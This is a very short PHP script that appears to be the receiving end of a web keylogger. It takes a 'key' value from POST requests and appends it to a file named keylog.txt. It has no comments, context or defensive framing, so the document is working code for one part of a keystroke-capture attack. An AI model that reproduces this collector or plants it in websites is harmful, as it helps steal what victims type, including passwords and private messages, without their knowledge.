<?php
$key = $_POST['key'];
$log = fopen("keylog.txt","a");
fwrite($log,$key);
fclose($log);
?>
